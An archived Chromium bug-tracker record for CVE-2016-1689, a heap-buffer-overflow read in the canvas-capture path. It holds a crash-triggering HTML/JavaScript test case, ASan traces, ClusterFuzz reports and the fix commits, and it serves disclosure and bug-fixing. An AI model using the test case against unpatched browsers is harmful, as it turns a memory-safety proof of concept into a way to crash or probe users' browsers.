# Heap-buffer-overflow in CopyAlphaChannelIntoVideoFrame

| Field | Value |
|-------|-------|
| **Issue ID** | [40084163](https://issues.chromium.org/issues/40084163) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Canvas |
| **CVE IDs** | CVE-2016-1689 |
| **Reporter** | at...@gmail.com |
| **Assignee** | em...@chromium.org |
| **Created** | 2016-04-24 |
| **Bounty** | $1,000.00 |

## Description


Tested on:

OS: Ubuntu 14.04

Chromium: asan-symbolized-linux-release-389396

Repro-file:

<html>
<head>
<script type='text/javascript'>
function boom() {
    var gl = canvas.getContext('experimental-webgl');
    video.srcObject = canvas.captureStream(0);
}
</script>
</head>
<body onload='boom();'>
    <video id='video' width='-602569' height='256'></video>
    <canvas id='canvas' width='256' height='257'></canvas>


ASAN-trace:

==10336==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7ff04ad9bc03 at pc 0x55ea817465f3 bp 0x7ffc6bbab050 sp 0x7ffc6bbab048
READ of size 1 at 0x7ff04ad9bc03 thread T0 (chrome)
    #0 0x55ea817465f2 in (anonymous namespace)::CopyAlphaChannelIntoVideoFrame(unsigned char const*, scoped_refptr<media::VideoFrame> const&) /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../content/renderer/media/canvas_capture_handler.cc:34
    #1 0x55ea81745667 in CreateNewFrame /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../content/renderer/media/canvas_capture_handler.cc:261 (discriminator 1)
    #2 0x55ea7c08722b in notifyListenersCanvasChanged /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../third_party/WebKit/Source/core/html/HTMLCanvasElement.cpp:421 (discriminator 1)
    #3 0x55ea7b0fd2ac in callInternal<0> /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../third_party/WebKit/Source/wtf/Functional.h:318 (discriminator 2)
    #4 0x55ea7b0fcffa in WTF::PartBoundFunctionImpl<(WTF::FunctionThreadAffinity)1, std::__1::tuple<blink::CrossThreadWeakPersistentThisPointer<blink::WebGLRenderingContextBase>&&>, WTF::FunctionWrapper<void (blink::WebGLRenderingContextBase::*)()>>::operator()() /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../third_party/WebKit/Source/wtf/Functional.h:309
    #5 0x55ea85734684 in prepareMailbox /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../third_party/WebKit/Source/platform/graphics/gpu/DrawingBuffer.cpp:251 (discriminator 1)
    #6 0x55ea81cde959 in PrepareTextureMailbox /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../cc/blink/web_external_texture_layer_impl.cc:74
    #7 0x55ea843893cc in Update /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../cc/layers/texture_layer.cc:208
    #8 0x55ea8446412e in DoUpdateLayers /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../cc/trees/layer_tree_host.cc:1027 (discriminator 1)
    #9 0x55ea84463847 in cc::LayerTreeHost::UpdateLayers() /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../cc/trees/layer_tree_host.cc:901 (discriminator 2)
    #10 0x55ea84539446 in BeginMainFrame /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../cc/trees/proxy_main.cc:207 (discriminator 1)
.
.
.
0x7ff04ad9bc03 is located 3 bytes to the right of 263168-byte region [0x7ff04ad5b800,0x7ff04ad9bc00)
allocated by thread T0 (chrome) here:
    #0 0x55ea7571d48b in operator new(unsigned long) ??:?
    #1 0x55ea75bde912 in __allocate /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../buildtools/third_party/libc++/trunk/include/new:168
    #2 0x55ea75bde56b in __append /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../buildtools/third_party/libc++/trunk/include/vector:1039 (discriminator 4)
    #3 0x55ea8174526b in CreateNewFrame /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../content/renderer/media/canvas_capture_handler.cc:228
    #4 0x55ea7c08722b in notifyListenersCanvasChanged /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../third_party/WebKit/Source/core/html/HTMLCanvasElement.cpp:421 (discriminator 1)
    #5 0x55ea7b0fd2ac in callInternal<0> /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../third_party/WebKit/Source/wtf/Functional.h:318 (discriminator 2)
    #6 0x55ea7b0fcffa in WTF::PartBoundFunctionImpl<(WTF::FunctionThreadAffinity)1, std::__1::tuple<blink::CrossThreadWeakPersistentThisPointer<blink::WebGLRenderingContextBase>&&>, WTF::FunctionWrapper<void (blink::WebGLRenderingContextBase::*)()>>::operator()() /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../third_party/WebKit/Source/wtf/Functional.h:309
    #7 0x55ea85734684 in prepareMailbox /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../third_party/WebKit/Source/platform/graphics/gpu/DrawingBuffer.cpp:251 (discriminator 1)
    #8 0x55ea81cde959 in PrepareTextureMailbox /mnt/data/b/build/slave/ASAN_Release__symbolized_/build/src/out/Release/../../cc/blink/web_external_texture_layer_impl.cc:74
.
.
.


## Attachments

- [chrome-heap-buffer-overflow-CopyAlphaChannelIntoVideoFrame-min.html](attachments/chrome-heap-buffer-overflow-CopyAlphaChannelIntoVideoFrame-min.html) (text/plain, 328 B)

## Timeline

### cl...@chromium.org (2016-04-25)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5359497547087872

### cl...@chromium.org (2016-04-25)

[Empty comment from Monorail migration]

### va...@chromium.org (2016-04-25)

[Empty comment from Monorail migration]

[Monorail components: Blink>Canvas]

### va...@chromium.org (2016-04-25)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-04-25)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5359497547087872

Uploader: mbarbella@google.com
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-buffer-overflow READ 1
Crash Address: 0x7f2e7f0dbc03
Crash State:
  content::CanvasCaptureHandler::CreateNewFrame
  blink::HTMLCanvasElement::notifyListenersCanvasChanged
  blink::DrawingBuffer::prepareMailbox
  
Recommended Security Severity: Medium

Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=383194:384397

Minimized Testcase (0.24 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94l7X-qyBPdRIuTKqUlDlH0kv8cP1Lq6QSLgAMPUtldHU8K1-9kMPh9OVsyiIGwOiiExwprye0aSKuJyA23SADAdO5fSA4EeFmLpzjTKWHJbYeCrV-IdXDPz9vRSBKyLIQElJGa_FD-gQHWR1RkMTI4PmJ3Qw
<script>
function boom() {
    var gl = canvas.getContext('experimental-webgl');
    video.srcObject = canvas.captureStream();
}
</script>
<body onload='boom();'<video id='video'></video>
    <canvas id='canvas' width='256' height='257'>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### sh...@chromium.org (2016-04-25)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-04-25)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-04-26)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/e0dd9f840b3a21cd12bd3d83f5ca63302549dd21

commit e0dd9f840b3a21cd12bd3d83f5ca63302549dd21
Author: emircan <emircan@chromium.org>
Date: Tue Apr 26 21:37:52 2016

Fix odd size and visible rect issues in CanvasCaptureHandler

This CL addresses odd size frame problems found by fuzz tests.

BUG=606185
TEST=Minimized fuzz test case now passes. Also added unit tests.

Review URL: https://codereview.chromium.org/1918073003

Cr-Commit-Position: refs/heads/master@{#389899}

[modify] https://crrev.com/e0dd9f840b3a21cd12bd3d83f5ca63302549dd21/content/renderer/media/canvas_capture_handler.cc
[modify] https://crrev.com/e0dd9f840b3a21cd12bd3d83f5ca63302549dd21/content/renderer/media/canvas_capture_handler_unittest.cc


### em...@chromium.org (2016-04-26)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-04-27)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### cl...@chromium.org (2016-04-28)

ClusterFuzz has detected this issue as fixed in range 389884:390115.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5359497547087872

Uploader: mbarbella@google.com
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-buffer-overflow READ 1
Crash Address: 0x7f2e7f0dbc03
Crash State:
  content::CanvasCaptureHandler::CreateNewFrame
  blink::HTMLCanvasElement::notifyListenersCanvasChanged
  blink::DrawingBuffer::prepareMailbox
  
Recommended Security Severity: Medium

Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=383194:384397
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=389884:390115

Minimized Testcase (0.24 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94l7X-qyBPdRIuTKqUlDlH0kv8cP1Lq6QSLgAMPUtldHU8K1-9kMPh9OVsyiIGwOiiExwprye0aSKuJyA23SADAdO5fSA4EeFmLpzjTKWHJbYeCrV-IdXDPz9vRSBKyLIQElJGa_FD-gQHWR1RkMTI4PmJ3Qw
<script>
function boom() {
    var gl = canvas.getContext('experimental-webgl');
    video.srcObject = canvas.captureStream();
}
</script>
<body onload='boom();'<video id='video'></video>
    <canvas id='canvas' width='256' height='257'>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### em...@chromium.org (2016-04-29)

[Empty comment from Monorail migration]

### ti...@google.com (2016-05-09)

[Empty comment from Monorail migration]

### ti...@google.com (2016-05-09)

Your change meets the bar and is auto-approved for M51 (branch: 2704)

### bu...@chromium.org (2016-05-10)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/8618a80561b51f948a49998beaa0489d64da896e

commit 8618a80561b51f948a49998beaa0489d64da896e
Author: emircan <emircan@chromium.org>
Date: Tue May 10 17:19:26 2016

Fix odd size and visible rect issues in CanvasCaptureHandler

This CL addresses odd size frame problems found by fuzz tests.

BUG=606185
TEST=Minimized fuzz test case now passes. Also added unit tests.

Review URL: https://codereview.chromium.org/1918073003

Cr-Commit-Position: refs/heads/master@{#389899}
(cherry picked from commit e0dd9f840b3a21cd12bd3d83f5ca63302549dd21)

NOTRY=true
NOPRESUBMIT=true

Review-Url: https://codereview.chromium.org/1962993002
Cr-Commit-Position: refs/branch-heads/2704@{#476}
Cr-Branched-From: 6e53600def8f60d8c632fadc70d7c1939ccea347-refs/heads/master@{#386251}

[modify] https://crrev.com/8618a80561b51f948a49998beaa0489d64da896e/content/renderer/media/canvas_capture_handler.cc
[modify] https://crrev.com/8618a80561b51f948a49998beaa0489d64da896e/content/renderer/media/canvas_capture_handler_unittest.cc


### ti...@google.com (2016-05-24)

[Empty comment from Monorail migration]

### ti...@google.com (2016-05-26)

Atte - $1,000 for this report. Congrats :)

CVE-ID is CVE-2016-1689.

### aw...@chromium.org (2016-07-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-08-03)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/606185?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/608055]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084163)*
